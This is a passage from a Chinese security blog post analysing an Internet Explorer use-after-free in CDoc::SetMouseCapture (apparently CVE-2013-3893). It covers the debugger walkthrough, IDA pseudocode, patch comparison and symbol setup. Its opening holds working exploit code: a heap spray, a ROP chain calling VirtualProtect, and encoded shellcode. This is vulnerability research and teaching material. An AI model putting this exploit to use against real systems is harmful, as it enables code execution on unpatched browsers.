&quot;\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c&quot;;//39x2字节</span></span></span><br><span class="line"><span class="javascript">​    			tt[i].className = <span class="string">&quot;\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04\u0c0c\u0c04&quot;</span>;</span></span><br><span class="line"><span class="javascript">​    			<span class="comment">//将eax赋值为0c0c0c00</span></span></span><br><span class="line">​    			&#125;</span><br><span class="line"><span class="javascript">​    			<span class="built_in">Math</span>.sin(<span class="number">1</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">​				<span class="comment">//alert(&quot;123&quot;);</span></span></span><br><span class="line">​			&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">​			<span class="built_in">Math</span>.cos(<span class="number">1</span>,<span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">​			father[<span class="string">&#x27;outerText&#x27;</span>]=<span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="javascript">​			<span class="built_in">Math</span>.cos(<span class="number">1</span>,<span class="number">2</span>);</span></span><br><span class="line">​			father.setCapture();</span><br><span class="line">​			child.setCapture();</span><br><span class="line"></span><br><span class="line"><span class="javascript">​			<span class="function"><span class="keyword">function</span> <span class="title">Heapspray</span>(<span class="params"></span>)</span></span></span><br><span class="line">​			&#123;</span><br><span class="line"><span class="javascript">​				<span class="comment">//var rop_gadget=&quot;\u0ae2\u760e&quot;; //760e0ae2 #mov esp,eax #dec ecx#retn</span></span></span><br><span class="line"><span class="javascript">​				<span class="keyword">var</span> rop_gadget=<span class="string">&quot;\u8d9e\u75b4&quot;</span> <span class="comment">//0x75b48d9e push ecx # pop esp #pop ebp</span></span></span><br><span class="line"><span class="javascript">​								+<span class="string">&quot;\u1480\u7690&quot;</span> <span class="comment">//0x76901480 ret</span></span></span><br><span class="line"><span class="javascript">​								+<span class="string">&quot;\u0c0c\u0c0c&quot;</span>  <span class="comment">//4 size</span></span></span><br><span class="line"><span class="javascript">​								+<span class="string">&quot;\u20d8\u7690&quot;</span> <span class="comment">//VirtualProtect 0x769020d8</span></span></span><br><span class="line"><span class="javascript">​								+<span class="string">&quot;\u0c30\u0c0c&quot;</span><span class="comment">// shellcode_addr</span></span></span><br><span class="line"><span class="javascript">​								+<span class="string">&quot;\u0c00\u0c0c&quot;</span><span class="comment">//arg4</span></span></span><br><span class="line"><span class="javascript">​								+<span class="string">&quot;\u1000\u0000&quot;</span><span class="comment">//arg3</span></span></span><br><span class="line"><span class="javascript">​								+<span class="string">&quot;\u0040\u0000&quot;</span><span class="comment">//arg2</span></span></span><br><span class="line"><span class="javascript">​								+<span class="string">&quot;\u0c0c\u0c0c&quot;</span>;<span class="comment">//arg1</span></span></span><br><span class="line"><span class="javascript">​				<span class="keyword">var</span> shellcode=<span class="string">&quot;\uc931\u8b64\u3041\u408b\u8b0c\u1470\u96ad\u8bad\u1058\u538B\u013c\u8bda\u7852\uda01\u728b\u0120\u31de\u41c9\u01ad\u81d8\u4738\u7465\u7550\u81f4\u0478\u6f72\u4163\ueb75\u7881\u6408\u7264\u7565\u8be2\u2472\ude01\u8b66\u4e0c\u8b49\u1c72\ude01\u148b\u018e\u31da\u53c9\u5152\u6168\u7972\u6841\u694c\u7262\u4c68\u616f\u5464\uff53\u83d2\u0cc4\u5059\uc031\ub866\u6c6c\u6850\u3233\u642e\u7568\u6573\u5472\u54ff\u1024\uc483\u500c\uc031\u6fb8\u4178\u5023\u6c83\u0324\u6823\u6761\u4265\u4d68\u7365\u5473\u74ff\u1024\u54ff\u1c24\uc483\u500c\uc031\ub866\u4646\u5450\uc031\u41b8\u4141\u5023\u6c83\u0324\u5423\uc031\uff50\u2474\uff04\u2474\u3110\u50c0\u54ff\u2024\uc483\u0010&quot;</span>;</span></span><br><span class="line"><span class="javascript">​				<span class="keyword">var</span> shellcode_old=<span class="string">&quot;\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6961\u656e\u6d68\u6769\u8b72\u53c4\u5050\uff53\ufc57\uff53\uf857&quot;</span>;</span></span><br><span class="line"><span class="javascript">​				<span class="keyword">var</span> sc=<span class="string">&quot;\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c&quot;</span>+rop_gadget+shellcode;</span></span><br><span class="line"><span class="javascript">​				<span class="keyword">var</span> nop=<span class="string">&quot;\u0c0c\u0c0c&quot;</span>;</span></span><br><span class="line"><span class="javascript">​				<span class="keyword">var</span> offset=<span class="number">0x5ee</span>-<span class="number">4</span>/<span class="number">2</span>;<span class="comment">//0xbdc/2-4/2</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">​				<span class="keyword">while</span>(nop.length&lt;<span class="number">0x10000</span>)</span></span><br><span class="line">​					nop+=nop;</span><br><span class="line"><span class="javascript">​				<span class="keyword">var</span> nop_chunk=nop.substring(<span class="number">0</span>,(<span class="number">0x10000</span>/<span class="number">2</span>-sc.length)); <span class="comment">//Unicode编码，所以0x10000/2个字节</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">​				<span class="keyword">var</span> sc_nop=sc+nop_chunk;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">​				<span class="comment">//组合成单个大小为0x80000的堆块（heap-feng-shui)</span></span></span><br><span class="line"><span class="javascript">​				<span class="keyword">while</span>(sc_nop.length&lt;<span class="number">0x100000</span>)</span></span><br><span class="line">​					sc_nop+=sc_nop;</span><br><span class="line"><span class="javascript">​				sc_nop=sc_nop.substring(<span class="number">0</span>,(<span class="number">0x80000</span>-<span class="number">6</span>)/<span class="number">2</span>-offset);<span class="comment">//组合成0x800000的堆块</span></span></span><br><span class="line"><span class="javascript">​				<span class="keyword">var</span> offset_pattern=nop.substring(<span class="number">0</span>,offset); </span></span><br><span class="line">​				code=offset_pattern+sc_nop;</span><br><span class="line"><span class="javascript">​				heap_chunks=<span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript">​				<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)</span></span><br><span class="line">​				&#123;</span><br><span class="line">​					heap_chunks[i]=code.substring(0,code.length);</span><br><span class="line">​				&#125;</span><br><span class="line">​			&#125;</span><br><span class="line">​		&#125;</span><br><span class="line"><span class="javascript">​		<span class="built_in">window</span>.setTimeout(<span class="string">&quot;trigger()&quot;</span>,<span class="number">1000</span>);</span></span><br><span class="line">​	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="EXP执行流分析"><a href="#EXP执行流分析" class="headerlink" title="EXP执行流分析"></a>EXP执行流分析</h4><p>直接进入一个gadget，执行栈翻转，esp被翻转到0c0c0c0c然后因为栈操作被继续提高到0c0c0c10，然后ret4跳转。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/MIeNeq.png" alt="MIeNeq"><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/TJTBcu.png" alt="TJTBcu"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/haMaXk.png" alt="haMaXk"></p>
<p>跳转前esp指向0c0c0c10，因为ret 4跳转之后esp变为了0c0c0c18而不是0c0c0c10</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/LIICjC.png" alt="LIICjC"> </p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/yKX3QB.png" alt="yKX3QB"> </p>
<p>在0c0c0c18埋下VirtualProtect的地址，成功进入程序流。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/1A37xg.png" alt="1A37xg"><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/OYxVo8.png" alt="OYxVo8"> </p>
<p>VirtualProtect其实只是VirtualProtectEX的一个外壳，在函数内部，将参数分别入栈再调用VirtualProtectEX。查看我们入栈的数据是否正确，发现EX函数比原函数多了一个参数。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/wNb2x5.png" alt="wNb2x5"> </p>
<p>执行之后eax返回1，说明执行成功，shellcode所在地址已经能够执行。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/g6bb5U.png" alt="g6bb5U"> </p>
<p>进入shellcode执行，成功弹窗。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/tEyOY2.png" alt="tEyOY2"> </p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/jtRbme.png" alt="jtRbme"> </p>
<h3 id="2-1-5漏洞原因和补丁分析"><a href="#2-1-5漏洞原因和补丁分析" class="headerlink" title="2.1.5漏洞原因和补丁分析"></a>2.1.5漏洞原因和补丁分析</h3><p>我们使用IDA逆向分析关键函数SetMouseCapture。</p>
<p>IDA 生成的伪代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __userpurge <span class="title">CDoc::SetMouseCapture</span><span class="params">(<span class="keyword">int</span> a1@&lt;eax&gt;, CDoc *a2@&lt;ecx&gt;, CDoc *lpMem, <span class="keyword">int</span> a4, <span class="keyword">void</span> *a5, <span class="keyword">int</span> a6, <span class="keyword">int</span> a7, <span class="keyword">int</span> a8)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CDoc *v8; <span class="comment">// ebx@1</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edi@1</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// eax@6</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ecx@7</span></span><br><span class="line">  <span class="keyword">void</span> *v12; <span class="comment">// eax@11</span></span><br><span class="line">  CImplPtrAry *v13; <span class="comment">// ecx@15</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">CElementCapture</span> *<span class="title">v14</span>;</span> <span class="comment">// esi@15</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// ecx@17</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// eax@18</span></span><br><span class="line">  CMessage *v17; <span class="comment">// ST14_4@22</span></span><br><span class="line">  CMessage *v18; <span class="comment">// ecx@22</span></span><br><span class="line">  CElementCapture *v19; <span class="comment">// ecx@23</span></span><br><span class="line">  CImplPtrAry *v20; <span class="comment">// ST14_4@24</span></span><br><span class="line">  CServer *v21; <span class="comment">// ecx@27</span></span><br><span class="line">  <span class="keyword">void</span> *v22; <span class="comment">// [sp+0h] [bp-A8h]@0</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [sp+10h] [bp-98h]@17</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [sp+14h] [bp-94h]@17</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [sp+A4h] [bp-4h]@6</span></span><br><span class="line">  <span class="keyword">void</span> *lpMema; <span class="comment">// [sp+B0h] [bp+8h]@12</span></span><br><span class="line"></span><br><span class="line">  v8 = lpMem;</span><br><span class="line">  v9 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)lpMem + <span class="number">469</span>) &amp; <span class="number">0x1000</span> ) <span class="comment">//没有对TreeNode对象是否在Dom做检查</span></span><br><span class="line">​    v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">​    v25 = (*((_DWORD *)lpMem + <span class="number">65</span>) &gt;&gt; <span class="number">2</span>) - <span class="number">1</span>;</span><br><span class="line">​    v10 = v25;</span><br><span class="line">​    <span class="keyword">if</span> ( v25 &lt; <span class="number">0</span> )</span><br><span class="line">​      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">​    v11 = *((_DWORD *)lpMem + <span class="number">67</span>) + <span class="number">4</span> * v25;</span><br><span class="line">​    <span class="keyword">do</span></span><br><span class="line">​    &#123;</span><br><span class="line">​      <span class="keyword">if</span> ( *(_DWORD *)(*(_DWORD *)v11 + <span class="number">8</span>) == v9 )</span><br><span class="line">​        <span class="keyword">break</span>;</span><br><span class="line">​      --v10;</span><br><span class="line">​      v11 -= <span class="number">4</span>;</span><br><span class="line">​    &#125;</span><br><span class="line">​    <span class="keyword">while</span> ( v10 &gt;= <span class="number">0</span> );</span><br><span class="line">​    <span class="keyword">if</span> ( v10 &lt; <span class="number">0</span> )</span><br><span class="line">​    &#123;</span><br><span class="line">LABEL_31:</span><br><span class="line">​      v12 = ATL_malloc(<span class="number">0x10</span>u);</span><br><span class="line">​      lpMema = (<span class="keyword">void</span> *)(v12 ? CElementCapture::CElementCapture(v12, a7, a8, a4, a5) : <span class="number">0</span>);</span><br><span class="line">​      <span class="keyword">if</span> ( lpMema )</span><br><span class="line">​      &#123;</span><br><span class="line">​        v14 = CDoc::GetLastCapture(v8);</span><br><span class="line">​        <span class="keyword">if</span> ( v14 &amp;&amp; CDoc::HasContainerCapture(v8, *(struct CElement ***)(v9 + <span class="number">20</span>)) )</span><br><span class="line">​        &#123;</span><br><span class="line">​          CMessage::CMessage(&amp;v23, <span class="number">0</span>);</span><br><span class="line">​          v24 = <span class="number">533</span>;</span><br><span class="line">​          CDoc::PumpMessage(v8, (struct CMessage *)&amp;v23, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">​          <span class="keyword">if</span> ( v14 == CDoc::GetLastCapture(v8) )</span><br><span class="line">​          &#123;</span><br><span class="line">​            v16 = *((_DWORD *)v14 + <span class="number">3</span>);</span><br><span class="line">​            <span class="keyword">if</span> ( !(v16 &amp; <span class="number">2</span>) )</span><br><span class="line">​            &#123;</span><br><span class="line">​              v15 = *((_DWORD *)v14 + <span class="number">2</span>);</span><br><span class="line">​              <span class="keyword">if</span> ( !(*(_DWORD *)(v15 + <span class="number">28</span>) &amp; <span class="number">0x8000000</span>) )</span><br><span class="line">​              &#123;</span><br><span class="line">​                *((_DWORD *)v14 + <span class="number">3</span>) = v16 | <span class="number">2</span>;</span><br><span class="line">​                *((_DWORD *)v8 + <span class="number">469</span>) |= <span class="number">0x1000</span>u;</span><br><span class="line">​                CElement::FireEvent(</span><br><span class="line">​                  *((CElement **)v14 + <span class="number">2</span>),</span><br><span class="line">​                  (<span class="keyword">const</span> struct PROPERTYDESC_BASIC *)&amp;s_propdescCElementonlosecapture,</span><br><span class="line">​                  <span class="number">1</span>,</span><br><span class="line">​                  <span class="number">0</span>,</span><br><span class="line">​                  <span class="number">-1</span>,</span><br><span class="line">​                  <span class="number">0</span>,</span><br><span class="line">​                  <span class="number">0</span>);</span><br><span class="line">​                *((_DWORD *)v8 + <span class="number">469</span>) &amp;= <span class="number">0xFFFFEFFF</span>;</span><br><span class="line">​              &#125;</span><br><span class="line">​            &#125;</span><br><span class="line">​          &#125;</span><br><span class="line">​          <span class="keyword">if</span> ( *((_DWORD *)v8 + <span class="number">65</span>) &amp; <span class="number">0xFFFFFFFC</span> )</span><br><span class="line">​          &#123;</span><br><span class="line">​            <span class="keyword">if</span> ( v14 == CDoc::GetLastCapture(v8) )</span><br><span class="line">​            &#123;</span><br><span class="line">​              CElementCapture::~CElementCapture(v19);</span><br><span class="line">​              <span class="function">CBlockElement::<span class="keyword">operator</span> <span class="title">delete</span><span class="params">((<span class="keyword">void</span> *)v14)</span></span>;</span><br><span class="line">​              CImplPtrAry::Delete(v20, (<span class="keyword">int</span>)v22);</span><br><span class="line">​            &#125;</span><br><span class="line">​            CImplPtrAry::Append(v19, v22);</span><br><span class="line">​          &#125;</span><br><span class="line">​          <span class="keyword">else</span></span><br><span class="line">​          &#123;</span><br><span class="line">​            CElementCapture::~CElementCapture((CElementCapture *)v15);</span><br><span class="line">​            <span class="function">CBlockElement::<span class="keyword">operator</span> <span class="title">delete</span><span class="params">(lpMema)</span></span>;</span><br><span class="line">​            v18 = v17;</span><br><span class="line">​          &#125;</span><br><span class="line">​          CMessage::~CMessage(v18);</span><br><span class="line">​        &#125;</span><br><span class="line">​        <span class="keyword">else</span></span><br><span class="line">​        &#123;</span><br><span class="line">​          CImplPtrAry::Append(v13, v22);</span><br><span class="line">​          <span class="keyword">if</span> ( !v14 )</span><br><span class="line">​            CServer::SetCapture(v21, <span class="number">1</span>);</span><br><span class="line">​        &#125;</span><br><span class="line">​      &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">​    CDoc::ClearMouseCapture(a2, lpMem);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对比微软的补丁可以知道，微软在进入LABEL_31:段前增加了判断，TreeNode是否在Dom树上，如果TreeNode不在Dom树上就不会进入LABEL_31的，也就不会触发漏洞。</p>
<p>经过之前的动态分析，可以知道进入LABEL_31之后会进入PumpMessage-&gt;NodeAddRef-&gt;GetInterface，最后导致UAF触发任意代码执行。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1].Use After Free Exploits for Humans Part 1 – Exploiting MS13-080 on IE8 winxpsp3[DB&#x2F;OL].</p>
<p><a target="_blank" rel="noopener" href="https://webstersprodigy.net/2014/11/19/use-after-free-exploits-for-humans-part-1-exploiting-ms13-080-on-ie8-winxpsp3/,2014-9-19">https://webstersprodigy.net/2014/11/19/use-after-free-exploits-for-humans-part-1-exploiting-ms13-080-on-ie8-winxpsp3/,2014-9-19</a></p>
<p>[2]Payload_82.(<a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&amp;uid=817719).%E6%9A%B4%E9%9B%B7%E6%BC%8F%E6%B4%9E">https://www.52pojie.cn/home.php?mod=space&amp;uid=817719).暴雷漏洞</a> （CVE-2012-1889）个人漏洞分析报告[DB&#x2F;OL].<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-730324-1-1.html,2018-4-24">https://www.52pojie.cn/thread-730324-1-1.html,2018-4-24</a></p>
<p>[3]0x9A82.IE浏览器漏洞综合利用技术：堆喷射技术[DB&#x2F;OL].<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-223106.htm,2017-12-4">https://bbs.pediy.com/thread-223106.htm,2017-12-4</a> </p>
<p>[4]Geek青松.(<a target="_blank" rel="noopener" href="https://me.csdn.net/u010142102).CVE-2013-3893">https://me.csdn.net/u010142102).CVE-2013-3893</a> IE浏览器UAF漏洞分析[DB&#x2F;OL]。<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010142102/article/details/89207164,2019-04-11">https://blog.csdn.net/u010142102/article/details/89207164,2019-04-11</a></p>
<p>[5]luobobo.CVE-2013-3893 详细分析[DB&#x2F;OL].<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-226879.htm,2018-5-19">https://bbs.pediy.com/thread-226879.htm,2018-5-19</a></p>
<p>扩展阅读</p>
<p>Crash和利用分析可以看这篇</p>
<p><a target="_blank" rel="noopener" href="http://www.freesion.com/article/137468367/">http://www.freesion.com/article/137468367/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wal613/p/3887719.html">https://www.cnblogs.com/wal613/p/3887719.html</a></p>
<p>IE浏览器安全</p>
<p><a target="_blank" rel="noopener" href="https://www.infoq.cn/article/Internet-Explorer-Security1/">https://www.infoq.cn/article/Internet-Explorer-Security1/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.infoq.cn/article/InternetExplorer-Security2/">https://www.infoq.cn/article/InternetExplorer-Security2/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/187650">https://www.anquanke.com/post/id/187650</a></p>
<p>Pwnable-UAF</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1345751">https://cloud.tencent.com/developer/article/1345751</a></p>
<p>浏览器运行原理（推荐）</p>
<p><a target="_blank" rel="noopener" href="https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#1_1">https://www.html5rocks.com/zh/tutorials/internals/howbrowserswork/#1_1</a></p>
<p>0x9A82师傅写的都是精品</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Ox9A82/p/5320857.html">UAF漏洞学习</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Ox9A82/p/5320857.html">https://www.cnblogs.com/Ox9A82/p/5320857.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Ox9A82/p/5782425.html">IE漏洞的调试心得</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Ox9A82/p/5782425.html">https://www.cnblogs.com/Ox9A82/p/5782425.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Ox9A82/p/5797123.html">CVE-2013-3893</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Ox9A82/p/5797123.html">https://www.cnblogs.com/Ox9A82/p/5797123.html</a></p>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>Windbg符号表设置</p>
<p>符号表设置在调试IE漏洞中非常重要，没有符号表调试过程就像盲人摸象，在Windbg中设置符号地址为</p>
<p>SRV<em>c:\Symbols</em><a target="_blank" rel="noopener" href="http://msdl.microsoft.com/download/symbols">http://msdl.microsoft.com/download/symbols</a></p>
<p>&gt;.reload 重新载入符号表</p>
<p><img src="https://s2.ax1x.com/2019/11/07/MARId1.png"> </p>
<p>如果载入出现问题，可以执行!sym noisy之后再进行reload，windbg会打印符号表载入细节。例如这里可以看的处是微软符号服务器的问题，无法下载对应PDB文件。如果是winxp系统，则是微软已经关闭了服务，无法通过这种方法下载。如果是win7及以上，可能是服务器抽风了，检查一下这个网站是否可以访问，多试几次一般就行了。</p>
<p>当初安装时候以为WIN7的符号表也和WinXP一样一声不响地关闭了，前两天还给Vista下载了符号表，然后这两天忽然就不行。不过到了第二天，忽然又可以载入符号表了，听大佬说到明年WIN7才会停止支持。</p>
<p><img src="https://s2.ax1x.com/2019/11/07/MARoIx.png" alt="img"> </p>
<p>对于winxp，因为符号包弃用，只能去下载别人的符号表。</p>
<p><img src="https://s2.ax1x.com/2019/11/07/MAR7i6.png" alt="img"> </p>
<p>.reload -f mshtml.dll下载mshtml.dll的符号表（pdb文件）。我们都知道mshtml是IE浏览器的用于解析页面最重要的组件。</p>
<p>然后就可以下断点了。调试IE如果没有符号表基本就没有办法好好调试了。</p>
<p>可以使用x 搜索mshtml中的函数进行下断点。</p>
<p><img src="https://s2.ax1x.com/2019/11/07/MARHJK.png" alt="img"> </p>
<p>IDA符号表设置</p>
<p>我们还可以将符号表加载到IDA，这样反汇编mshtml.dll时里面的函数就会真正拥有它本来的姓名，而不是sub_xxx的名称。</p>
<p>使用file-load file-PDB file就能加载符号表了。当然还是建议在mshtml本地环境（我这里是WIn7 SP1）安装一个IDA pro6.8，这样也会少去了很多步骤。</p>
<p><img src="https://s2.ax1x.com/2019/11/07/MARbRO.png" alt="img"> </p>
<p>加载符号表之前</p>
<p><img src="https://s2.ax1x.com/2019/11/07/MARqzD.png" alt="img"> </p>
<p>加载符号表之后</p>
<p><img src="https://s2.ax1x.com/2019/11/07/MAROQe.png" alt="img"> </p>
<p>符号表的一些参考文献：</p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/4828583/error-symbol-file-could-not-be-found-windbg-exe">https://stackoverflow.com/questions/4828583/error-symbol-file-could-not-be-found-windbg-exe</a></p>
<p><a target="_blank" rel="noopener" href="https://www.wintellect.com/the-secret-to-avoiding-debugger-slowdowns/">https://www.wintellect.com/the-secret-to-avoiding-debugger-slowdowns/</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Migraine殇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://migraine-sudo.github.io/2019/11/07/%E6%B5%8F%E8%A7%88%E5%99%A8UAF/">https://migraine-sudo.github.io/2019/11/07/%E6%B5%8F%E8%A7%88%E5%99%A8UAF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://migraine-sudo.github.io" target="_blank">Migraine殇</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Exploit/">Exploit</a></div><div class="post_share"><div class="social-share" data-image="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/NKHE2n.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2019/11/12/Three-Write/"><img class="prev-cover" src="/img/5WTH0f.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">红帽杯PWN题-Three 解析</div></div></a></div><div class="next-post pull-right"><a href="/2019/10/26/Gusubei/"><img class="next-cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/3mxaVq.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">从东南到东南 --姑苏杯信安大赛小记</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2019/10/22/HeapSpray/" title="HeapSpray入门"><img 